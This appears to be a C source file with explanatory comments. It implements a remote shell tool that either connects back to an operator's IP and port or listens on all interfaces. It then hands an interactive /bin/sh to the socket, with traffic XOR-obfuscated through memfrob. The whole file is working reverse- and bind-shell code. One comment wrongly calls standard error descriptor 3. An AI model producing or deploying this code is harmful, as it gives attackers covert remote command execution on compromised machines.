#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

// Creates a socket, fills in the network data and binds the socket
// to a specific port given as a parameter.
//
// Note that the address passed to bind is the constant INADDR_ANY.
// This is actually IP 0.0.0.0 and it means that the socket will be
// listening on all interfaces.
//
// Returns file descriptor of the accepted connection.
int
server_init (int port)
{
        int s, s1;
        socklen_t clen;
        struct sockaddr_in serv, client;

        if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror ("socket:");
                exit (EXIT_FAILURE);
        }

        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        serv.sin_addr.s_addr = htonl(INADDR_ANY);

        if ((bind (s, (struct sockaddr *)&serv,
                   sizeof(struct sockaddr_in))) < 0)
        {
                perror ("bind:");
                exit (EXIT_FAILURE);
        }

        if ((listen (s, 10)) < 0)
        {
                perror ("listen:");
                exit (EXIT_FAILURE);
        }
        clen = sizeof(struct sockaddr_in);
        if ((s1 = accept (s, (struct sockaddr *) &client,
                          &clen)) < 0)
        {
                perror ("accept:");
                exit (EXIT_FAILURE);
        }
        return s1;

}

// Receives as parameters an IP address to connect to
// and a port. Then it creates a TCP socket (SOCK_STREAM)
// and fills in the data for connecting. The connection
// is effectively established after a successful execution
// of connect. In case of any error (creating the socket or
// connection) we just stop the application.
//
// Returns the file descriptor from where to send/receive
// client data
int
client_init (char *ip, int port)
{
        int s;
        struct sockaddr_in serv;

        printf ("+ Connecting to %s:%d\n", ip, port);

        if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror ("socket:");
                exit (EXIT_FAILURE);
        }

        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        serv.sin_addr.s_addr = inet_addr(ip);

        if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0)
        {
                perror("connect:");
                exit (EXIT_FAILURE);
        }

        return s;
}


// Function that allow us to implement a reverse remote shell.
//
// It makes use of two system calls dup2 and execv. The first one
// duplicates a given file descriptor. In this case, the three
// calls at the beginning of the function, assigns the file
// descriptor received as parameter to the Standard Input (file
//  descriptor 0), Standard Output (file descriptor 1) and
// Standard Error (file descriptor 3).
//
// If the file descriptor we pass as a parameter is one of the
// sockets created with our previous client and server functions,
// we are effectively sending and receiving data through the
// network every time we write data to the console and we read data
// from stdin.
int
start_shell (int s)
{
        char *name[3];

        printf ("+ Starting shell\n");
        dup2 (s, 0);
        dup2 (s, 1);
        dup2 (s, 2);

        name[0] = "/bin/sh";
        name[1] = "-i";
        name[2] = NULL;
        execv (name[0], name );
        exit (1);

        return 0;
}


// This function decode the information received from the network sends
// it to the shell using the counterpart socket (from the socketpair)
// system call.
//
// At the same time, whenever the shell produces some output, this function
// will read that data, crypt it and send it over the network.
//
// Receives as parameters two file descriptors, one representing the
// socketpair end for communications with the shell (s1) and the
// other for networking (s).
void
async_read (int s, int s1)
{
        fd_set rfds;
        struct timeval tv;
        int max = s > s1 ? s : s1;
        int len, r;
        char buffer[1024];

        max++;
        while (1)
        {
                // macros to initialize the file descriptor set
                FD_ZERO(&rfds);
                FD_SET(s,&rfds);
                FD_SET(s1,&rfds);

                /* Time out. */
                // set to 1 second
                // microseconds resolution
                tv.tv_sec = 1;
                tv.tv_usec = 0;

                // standard select loop for a network application.
                if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
                {
                        perror ("select:");
                        exit (EXIT_FAILURE);
                }
                else if (r > 0) /* If there is data to process */
                {

                  // The memfrob function does a XOR crypting with
                  // key (42). The greatest thing about XOR crypting is that the
                  // same function can be used for crypt and decrypt. Other than
                  // that, with a 1 byte long key (42 in this case) it is pretty
                  // useless.
                        if (FD_ISSET(s, &rfds))
                        {
                                // get data in our network socket, we just read the data,
                                // decrypt it and resend it to our shell.
                                memset (buffer, 0, 1024);
                                if ((len = read (s, buffer, 1024)) <= 0) exit (1);
                                memfrob (buffer, len);

                                write (s1, buffer, len);
                        }
                        if (FD_ISSET(s1, &rfds))
                        {
                                // get data from our shell, we read it, we crypt it and
                                // we send it back to the network client.
                                memset (buffer, 0, 1024);
                                if ((len = read (s1, buffer, 1024)) <= 0) exit (1);

                                memfrob (buffer, len);
                                write (s, buffer, len);
                        }
                }
        }
}

// Set up the socket pair and create a new process (using fork)
//
// Function creates a socket pair using the syscall socketpair).
// The fork system call creates a new process as an identical image
// that make use of the sp socketpair to communicate both processes.
//
// Instead of feeding data into our shell directly from the network,
// function is used to send/receive data using the counterpart socket
// provided by socketpair.
void
secure_shell (int s)
{
        pid_t pid;
        int sp[2];

        /* Create a socketpair to talk to the child process */
        if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
        {
                perror ("socketpair:");
                exit (1);
        }

        /* Fork a shell */
        if ((pid = fork ()) < 0)
        {
                perror ("fork:");
                exit (1);
        }
        else
        if (!pid) /* Child Process */
        {
                close (sp[1]);
                close (s);

                start_shell (sp[0]);
                /* This function will never return */
        }

        /* At this point we are the father process */
        close (sp[0]);

        printf ("+ Starting async read loop\n");
        async_read (s, sp[1]);

}

int
main (int argc, char *argv[])
{
        /* FIXME: Check command-line arguments */
        if (argv[1][0] == 'c')
                secure_shell (client_init (argv[2], atoi(argv[3])));
        else if (argv[1][0] == 's')
                secure_shell (server_init (atoi(argv[2])));
        else if (argv[1][0] == 'a')
                async_read (client_init (argv[2], atoi(argv[3])), 0);
        else if (argv[1][0] == 'b')
                async_read (server_init (atoi(argv[2])), 0);


        return 0;
}
